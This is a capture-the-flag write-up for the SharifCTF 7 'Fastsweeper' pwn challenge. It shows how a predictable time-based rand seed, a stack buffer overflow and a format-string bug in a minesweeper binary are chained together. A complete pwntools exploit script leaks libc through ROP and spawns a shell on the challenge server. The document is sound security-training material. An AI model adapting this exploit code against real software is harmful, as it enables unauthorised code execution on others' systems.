---
title: 'SharifCTF 7: Fastsweeper (pwn 300)'
date: 2016-12-18 00:00:00 Z
categories:
- writeup
tags:
- cat/pwn
- tool/radare
- tool/pwntools
layout: post
author: f0rki
---

* **Category:** pwn
* **Points:** 300
* **Description:**

> Can you solve it in only 15 seconds? Well, I bet it's impossible!
>
> nc ctf.sharif.edu 54516

## Write-up

In this challenge we are given a minesweeper clone, that we can play. Pretty
soon we noticed that the random number generator to initialize the minefield
is `rand`, which is seeded with `srand(time(0))`. This is a pretty bad seed
because we can predict it with second resolution. A second is pretty long.

So if we know the seed to the RNG we know where the bombs are and don't need
to create a minesweeper solver. So we took a look at what happens after we
have won. Turns out there is a function at `0x00401d96`, let's call it
`win_printer`, which is called if we win and contains a pretty obvious buffer
overflow and also a format string vulnerability.

```
mov rdx, qword [obj.stdin]
lea rax, [rbp - local_70h]     ; read at rbp - 0x70
mov esi, 0x800                 ; up to 0x800 bytes
mov rdi, rax                   ; stack-based bufferoverflow -> ROP
call sym.imp.fgets ;[e]; char *fgets(char *s, int size, FILE *stream);
mov edi, str._nsubmitted_
call sym.imp.puts ;[b]; int puts(const char *s);
lea rax, [rbp - local_70h]     ; and print input with printf
mov rdi, rax                   ; format string vulnerability
mov eax, 0
call sym.imp.printf ;[d]; int printf(const char *format);
```

also no stack canaries

```
[0x00401d96]> i~can
canary   false
```

So we can happily ROP away into sunset as soon as we win minesweeper.

So we reverse engineered (aka copy-pasted from a certain decompiler) the field
setup function and made a C version out of it. We then launched a socket to the
challenge server and started our program. We then tried whether there are
strategies which would make us faster, but we didn't find a way to open up more
than one field at once.

We also used a shell we got from a previous pwn challenge to find out the
clock difference of the server and our machine. Turns out it was
131 seconds, which is quite a lot more than we expected. It would be possible
to bruteforce this, but this way it's a little more precise. Further it 
may take a couple of tries to get the seeding right.

So we put a python script around this to play minesweeper and we managed to
play through it, but never reached the winning condition. That sucked. So we
contacted the admins to see whether this was intended and a couple of minutes
later the challenge was taken down. The next day in the morning the challenge
was back up, but changed quite a bit. It was a 16x16 field now and it had some
additional checks and also the input didn't consit only of the two 
coordinates in the field anymore, but now had a third number.

It took us a while to figure out what this third number was for. To trigger the
winning condition you had to tell it where all the bombs are. The third number
was for this.

So we played minesweeper and triggered the winning condition by also marking
all bombs. Then used the buffer overflow on the stack to put our ROP chain on
the stack. We leaked the address of the libc with a first ROP chain and with a
second one we jumped to system.

Here is the python part of the exploit.

```python
#!/usr/bin/env python
# for second version

import subprocess as sp

from pwn import *  # NOQA

# libc = ELF("/usr/lib/libc-2.24.so")
# leaked libc from a previous pwn challenge
libc = ELF("../persian_150/lib/x86_64-linux-gnu/libc-2.19.so")
velf = ELF("./fastsweeper")
context.arch = velf.arch

gdbscript = """
init-pwndbg
# break *0x00401c9e
break *0x00401597
break *0x00401630  # cmp with first num
break *0x00401ded
"""
# vp = process("./fastsweeper")
# vp = process("./fastsweeper_patched")
vp = remote("ctf.sharif.edu", 54516)

# ######### play ########## #

o = sp.check_output(['./init_field', '131'])
# o = sp.check_output(['./init_field', '0'])
# print(o)
moves = []
bombs = []
for line in o.split("\n"):
    if line.strip():
        x = line.split(" ")
        if x[-1] != "*":
            i, j, v = map(int, x)
            moves.append((v, i, j))
        else:
            i, j = map(int, x[:-1])
            bombs.append((i, j))

# moves = sorted(moves)[::-1]
moves = sorted(moves)

prog = log.progress("fastsweeper playthrough")
for _, x, y in moves:
    vp.sendline("{} {} {}".format(0, x, y))
    lines = "\n"
    lines += vp.recvuntil("\t|0|")
    for _ in range(18):
        lines += vp.recvline()
    lines = lines.replace("\t", "    ")
    # log.info(lines)
    prog.status("made move {} {}\n{}".format(x, y, lines))
    if "*" in lines or "wanna" in lines:
        prog.failure("failed at move {} {}\n{}".format(x, y, lines))
        log.error("move failed")
    if "win" in lines:
        prog.success("win at move {} {}\n{}".format(x, y, lines))
        break
    if "brute" in lines:
        prog.failure("bruteforce detection at move {} {}\n{}"
                     .format(x, y, lines))
else:
    prog.success("all moves depleted")

prog = log.progress("opening bombs")
for x, y in bombs:
    vp.sendline("{} {} {}".format(1, x, y))
    lines = "\n"
    lines += vp.recvuntil("\t|0|")
    for _ in range(18):
        lines += vp.recvline()
    lines = lines.replace("\t", "    ")
    # log.info(lines)
    prog.status("opened bomb {} {}\n{}".format(x, y, lines))
    if "*" in lines or "wanna" in lines:
        prog.failure("failed at move {} {}\n{}".format(x, y, lines))
        log.error("failed")
    if "win" in lines:
        prog.success("win at move {} {}\n{}".format(x, y, lines))
        break
    if "brute" in lines:
        prog.failure("bruteforce detection at move {} {}\n{}"
                     .format(x, y, lines))
else:
    prog.success("all moves depleted")


for _ in range(18):
    vp.recvline()

x = vp.recvline()

if "win" not in x:
    vp.interactive()
    exit()

# ######### exploit ########## #

log.info("launching exploit!")

# gdb.attach(vp, gdbscript)

# context.log_level = "debug"
# vp.sendline(cyclic(0x100, n=8))
off = 120
pad = "A" * off

# pl = pad + p64(0xdeadc0de)
# vp.sendline(pl)

# vp.interactive()

win_printer = 0x00401d96
# pop_rdi = 0x00401dc3
sh_string = 0x0040045f

# first rop chain

chain = ROP(velf)
chain.puts(velf.got['printf'])
chain.puts(velf.got['fgets'])
chain.call(win_printer)  # jump back for second rop chain

log.info("using rop chain:\n" + chain.dump())

pl = pad + str(chain)
if "\n" in pl:
    log.error("newline in payload:\n" + hexdump(pl))
vp.sendline(pl)

vp.recvuntil("gg!\n")

# leak printf and fgets

printf_leaked = vp.recvline()[:-1]
printf_leaked += "\x00" * (8 - len(printf_leaked))
log.info("printf leak:\n" + hexdump(printf_leaked))
printf_leaked = u64(printf_leaked)

fgets_leaked = vp.recvline()[:-1]
fgets_leaked += "\x00" * (8 - len(fgets_leaked))
log.info("fgets leak:\n" + hexdump(fgets_leaked))
fgets_leaked = u64(fgets_leaked)

# calculate libc base with leaked address

libc.address = fgets_leaked - libc.symbols['fgets']
# system = libc.symbols['system']

# second rop chain, just jump to system with "sh\x00" as arg

chain2 = ROP([velf, libc])
chain2.system(sh_string)

log.info("second rop chain:\n" + chain2.dump())

pl = pad + str(chain2)
if "\n" in pl:
    log.error("newline in payload:\n" + hexdump(pl))
vp.sendline()
vp.sendline(pl)

vp.sendline("id;pwd;ls")

vp.interactive()
```

And the code for the field initialization:

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int field[256] = {0, };
time_t seed;

void init_field()
{
  unsigned int v0; // eax@1
  int v2; // [sp+8h] [bp-8h]@1
  int v3; // [sp+8h] [bp-8h]@8
  int i; // [sp+8h] [bp-8h]@11
  int v5; // [sp+Ch] [bp-4h]@1
  int v6; // [sp+Ch] [bp-4h]@8
  int v7; // [sp+Ch] [bp-4h]@11

  srand(seed);

  // place the bombs
  size_t bomb_count = 0;
  while ( bomb_count < 50 )
  {
    v6 = rand() % 16;
    v3 = rand() % 16;
    if ( field[v3 + 16 * v6] != '*' )
    {
      field[v3 + 16 * v6] = '*';
      ++bomb_count;
    }
  }

  // calculate the counts
  for (i = 0; i < 16; ++i ) {
    for (v7 = 0; v7 < 16; v7++) {
      if ( field[i + 16 * v7] != '*' ) {
        field[i + 16 * v7] = 0;
        if ( field[i - 1 + 16 * (v7 - 1)] == '*')
          ++field[i + 16 * v7];
        if ( field[i + 16 * (v7 - 1)] == '*' )
          ++field[i + 16 * v7];
        if ( field[i - 1 + 16 * v7] == '*' )
          ++field[i + 16 * v7];
        if ( field[i + 1 + 16 * (v7 - 1)] == '*' )
          ++field[i + 16 * v7];
        if ( field[i - 1 + 16 * (v7 + 1)] == '*' )
          ++field[i + 16 * v7];
        if ( field[i + 16 * (v7 + 1)] == '*' )
          ++field[i + 16 * v7];
        if ( field[i + 1 + 16 * v7] == '*' )
          ++field[i + 16 * v7];
        if ( field[i + 1 + 16 * (v7 + 1)] == '*' )
          ++field[i + 16 * v7];
      }
    }
  }
}


int main(int argc, char* argv[]) {
  /*seed = time(0LL) + 131;*/
  time_t i = 0;
  if (argc == 2) {
    i = atoi(argv[1]);
  }
  seed = time(0LL) + i;

  init_field();

#if 0
  for (size_t v5 = 0; v5 < 16; v5++)
  {
    for (size_t v2 = 0; v2 < 16; v2++)
    {
      int val = field[v5 + 16 * v2];
      if (val < 10) {
        fprintf(stderr, "%c ", val + '0');
      } else {
        fprintf(stderr, "%c ", val);
      }
    }
    fprintf(stderr, "\n");
  }
#endif

  for (size_t v2 = 0; v2 < 16; v2++)
  {
    for (size_t v5 = 0; v5 < 16; v5++)
    {
      int val = field[v2 + 16 * v5];
      char c = val;
      if (val < 10) {
        c += '0';
      }
      printf("%zd %zd %c\n", v5, v2, c);
    }
  }

  return 0;
}
```
